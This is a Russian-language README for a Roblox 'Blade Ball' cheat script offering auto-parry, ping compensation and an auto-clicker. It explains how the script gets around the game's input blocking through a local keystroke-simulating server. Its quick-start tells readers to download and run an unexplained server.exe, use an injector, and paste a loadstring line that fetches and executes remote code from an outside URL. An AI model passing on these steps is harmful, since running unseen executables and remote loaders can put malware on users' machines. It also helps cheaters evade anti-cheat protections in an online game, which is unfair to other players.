# Blade Ball Script

---

## ─── Быстрый старт ───

1. Скачайте и запустите исполняемый файл `server.exe` (находится в репозитории выше).
2. Запустите любой совместимый инжектор (тестировалось на **Xeno** и **Madium**).
3. Скопируйте и выполните в инжекторе:

```lua
loadstring(game:HttpGet("[https://api.kodamo.net/loader/1u4taz87hy4tpn2dkei5](https://api.kodamo.net/loader/1u4taz87hy4tpn2dkei5)"))()
```
## ─── Архитектура и назначение сервера ───

В актуальных версиях Blade Ball блокируется (`VirtualInput` и `VirtualInputManager`). 

Для обхода этого ограничения реализована клиент-серверная архитектура:
* Скрипт отправляет сетевой сигнал на локальный сервер (`server.exe`).
* Сервер аппаратно имитирует нажатия клавиш на стороне системы.

*Примечание: Данный костыль является временным решением. В будущих обновлениях планируется переход на полностью автономный обход защиты.*

---

## ─── Обзор функционала и оптимизация ───

* **Auto-Parry (Авто-парри):** Поддерживает динамическую подстройку дистанции срабатывания в зависимости от скорости мяча.
* **Компенсатор пинга (Ping Compensation):** 
  Рекомендуется выставлять значение вашего реального пинга с запасом в `+30–40` мс. Если скрипт периодически опаздывает с блоком, вручную увеличьте значение компенсации на `+10` мс.
* **Auto-Clicker (Авто-кликер):** 
  Текущая реализация может вызывать просадки FPS на слабых ПК. Если вы столкнулись с падением кадров, используйте сторонние альтернативы до выхода оптимизации в следующем патче.
* **Управление горячими клавишами (Binds):** 
  Присутствует возможность назначения индивидуальных биндов на функции Auto-Parry и Auto-Clicker.
* **Интерфейс:** 
  Свернуть/развернуть графическое меню скрипта можно нажатием клавиши `[ M ]`.
